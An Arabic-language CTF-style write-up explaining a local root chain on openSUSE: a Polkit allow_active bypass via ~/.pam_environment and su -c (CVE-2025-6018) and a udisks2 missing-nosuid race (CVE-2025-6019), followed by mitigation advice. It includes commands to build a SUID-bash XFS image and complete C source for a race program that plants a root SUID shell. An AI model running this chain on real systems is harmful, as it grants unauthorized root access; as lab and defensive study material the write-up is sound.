Polkit Bypass — CVE-2025-6018

CVE-2025-6018
CVE-2025-6018

openSUSE pam_env.so — Polkit allow_active Bypass via su

openSUSE Leap 15.6  |  pam_systemd / Polkit session bypass  |  2025

جلسات SSH تملك Remote=yes في logind، لذا Polkit يرفض أي عملية تتطلب allow_active (مثل udisksctl loop-setup). حقن XDG_SEAT=seat0 و XDG_VTNR=1 عبر ~/.pam_environment يُسجّل الجلسة على seat0 في loginctl، لكنه لا يُغيّر قيمة Remote لأن sshd يُعيّن PAM_RHOST مما يجعل pam_systemd يضع Remote=yes دائماً.

الاكتشاف الحقيقي: أمر su -c يُنشئ جلسة PAM جديدة حيث sshd لا يُعيّن PAM_RHOST، فيُسجّل pam_systemd الجلسة بـ Remote=no → Polkit يقبل عمليات allow_active.

آلية الاستغلال:

  • 1
    حقن XDG vars عبر ~/.pam_environment يُسجّل الجلسة على seat0 في loginctl — شرط أساسي لكنه غير كافٍ وحده.
  • 2
    إعادة الدخول عبر SSH لتفعيل المتغيرات pam_env.so يُطبّق المتغيرات عند كل login جديد.
  • 3
    استخدام su -c لتجاوز Polkit su -c "cmd" - phileasfogg3 ينشئ جلسة PAM محلية بـ Remote=no → Polkit يمنح allow_active.
BASH — Target تطبيق CVE-2025-6018 — حقن XDG vars

Root via udisks2 SUID Race — CVE-2025-6019

CVE-2025-6019
CVE-2025-6019

udisks2 — Missing nosuid during XFS Filesystem.Resize

udisks2 < 2.10.x  |  D-Bus TOCTOU Race Condition  |  2025

udisks2 يوفر D-Bus API لعمليات الأقراص من مستوى المستخدم. الثغرة: عند تنفيذ عملية Filesystem.Resize على image file يحتوي نظام ملفات XFS، يقوم udisks2 بـ mount الـ image مؤقتاً بدون خيار nosuid. هذا يعني أن أي ملف SUID داخل الـ image يُنفَّذ بصلاحيات root.

نافذة الزمن بين الـ mount والـ unmount قصيرة جداً (race condition)، لذا نستخدم برنامج مراقبة يرصد متى تُركَّب الـ image ويُنفّذ الـ SUID binary فوراً.

خطوات الاستغلال بالتفصيل:

الخطوة 1: تجهيز XFS Image على Kali

BASH — Kali (Terminal 1) بناء XFS image بـ SUID bash وتجميع racer 
# إنشاء 300MB XFS image يحتوي SUID bash
dd if=/dev/zero of=/tmp/xfs_new.img bs=1M count=300
mkfs.xfs -f /tmp/xfs_new.img
sudo mkdir -p /tmp/mnt
sudo mount -o loop,suid /tmp/xfs_new.img /tmp/mnt
sudo cp /bin/bash /tmp/mnt/xpl
sudo chmod 4755 /tmp/mnt/xpl
sudo umount /tmp/mnt

# التحقق من SUID

# تجميع racer.c (كود الـ race condition)
gcc -O2 -o /tmp/racer /tmp/racer.c

# تشغيل HTTP server لنقل الملفين إلى الـ target
cd /tmp && sudo python3 -m http.server 80

الخطوة 2: برنامج Race Condition (racer.c)

يراقب /run/media/phileasfogg3/ — المسار الذي يُركّب فيه udisks2 الـ image — ويُنفّذ الـ xpl (SUID bash) فور رؤيته:

C racer.c — مراقبة /run/media/phileasfogg3/ وتنفيذ SUID 
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

int main() {
    char xpl[512]; struct stat st;
    printf("[*] Racer started...\n"); fflush(stdout);
    while(1) {
        DIR *d = opendir("/run/media/phileasfogg3");
        if (!d) { usleep(20000); continue; }
        struct dirent *e;
        while((e = readdir(d)) != NULL) {
            if(e->d_name[0] == '.') continue;
            snprintf(xpl, sizeof(xpl),
                "/run/media/phileasfogg3/%s/xpl", e->d_name);
            if(stat(xpl, &st) == 0 && (st.st_mode & S_ISUID)) {
                unlink("/tmp/b");
                pid_t pid = fork();
                if (pid == 0) {
                    execl(xpl, xpl, "-p", "-c",
                        "cp /bin/bash /tmp/b; chmod 4755 /tmp/b", NULL);
                    _exit(1);
                } else if (pid > 0) {
                    waitpid(pid, NULL, 0);
                    struct stat bst;
                    if(stat("/tmp/b", &bst)==0 &&
                       bst.st_uid==0 && (bst.st_mode & S_ISUID)) {
                        printf("[+] RACE WON! /tmp/b is root SUID bash!\n");
                        fflush(stdout); closedir(d); return 0;
                    }
                }
            }
        }
        closedir(d); usleep(500);
    }
}

التحليل التقني — كيف تعمل الثغرات

🔍 CVE-2025-6018: لماذا يعمل حقن XDG_SEAT؟

Polkit (PolicyKit) هو framework للتحكم في الصلاحيات في Linux. يُميّز بين نوعين من الجلسات:

  • allow_inactive: جلسة SSH أو remote — صلاحيات محدودة
  • allow_active: جلسة console/local — صلاحيات أوسع

logind (systemd) يُحدد نوع الجلسة بناءً على XDG_SEAT و XDG_VTNR. في openSUSE، pam_env.so يُعيّن هذين المتغيرين من ~/.pam_environment قبل أن يسجّل logind الجلسة، مما يجعل الجلسة تبدو كـ active session.

FLOW تدفق CVE-2025-6018 
SSH Login
   │
   ▼
pam_env.so reads ~/.pam_environment
   │  XDG_SEAT=seat0
   │  XDG_VTNR=1
   ▼
PAM sets environment variables in new session
   │
   ▼
logind registers session WITH XDG_SEAT + XDG_VTNR
   │  → Session Type: x11/mir (active)
   ▼
Polkit checks session type
   │  → org.freedesktop.login1.Session.Type = "active"
   ▼
Policy: allow_active ✓ (instead of allow_inactive)

🔍 CVE-2025-6019: لماذا udisks2 يُركّب بدون nosuid؟

عند استدعاء Filesystem.Resize على XFS image، udisks2 ينفّذ الخطوات التالية داخلياً:

FLOW تدفق CVE-2025-6019 — سبب الثغرة 
udisks2 receives D-Bus Filesystem.Resize request
   │
   ▼
Creates temp mount point: /tmp/blockdev.XXXXXX/
   │
   ▼
Mounts the XFS image:
   mount -t xfs /dev/loopX /tmp/blockdev.XXXXXX/
   │
   │  ⚠️  BUG: Missing "nosuid" mount option!
   │  Correct:   mount -o nosuid,nodev -t xfs ...
   │  Actual:    mount -t xfs ...  (no nosuid!)
   ▼
Runs xfs_growfs to resize
   │
   ▼  ← RACE WINDOW HERE (milliseconds)
   │  Files inside mount are executed WITH their SUID bits
   │  Our /tmp/blockdev.XXXXXX/xpl is -rwsr-xr-x root
   │  Running it gives euid=0
   ▼
udisks2 unmounts (too late, we already ran xpl)

الدروس المستفادة والتوصيات

  • ⚠
    تحديث Pterodactyl Panel يجب تحديث Panel إلى أحدث إصدار وتطبيق security patches لـ CVE-2025-49132 (Arbitrary File Read). تقييد الوصول إلى endpoints التي تتعامل مع مسارات الملفات وتطبيق path traversal protection.
  • ⚠
    تعطيل pam_env ~/.pam_environment على openSUSE يجب تعطيل قراءة ~/.pam_environment في pam_env.so أو تصحيح منطق Polkit/logind للتحقق من نوع الجلسة بشكل مستقل عن XDG_SEAT.
  • ⚠
    تحديث udisks2 وإضافة nosuid يجب تحديث udisks2 إلى الإصدار المُرقَّع. في النسخة المُصلَّحة، تُضاف خيارات nosuid,nodev,noexec عند mount الـ filesystems المؤقتة.
  • ⚠
    عدم إعادة استخدام كلمات المرور كلمة مرور قاعدة البيانات يجب أن تختلف تماماً عن كلمة مرور حساب Linux. تطبيق مبدأ Least Privilege للمستخدمين.
  • 💡
    سلسلة الاستغلال المبدعة الجمع بين CVE-2025-6018 (Polkit bypass) و CVE-2025-6019 (udisks2) هو مثال ممتاز على كيفية ربط ثغرات متعددة ومنخفضة الخطورة منفردةً لتحقيق root. هذا النوع من الاستغلال المتسلسل شائع في CTFs ومهارة جوهرية للـ pentesters.
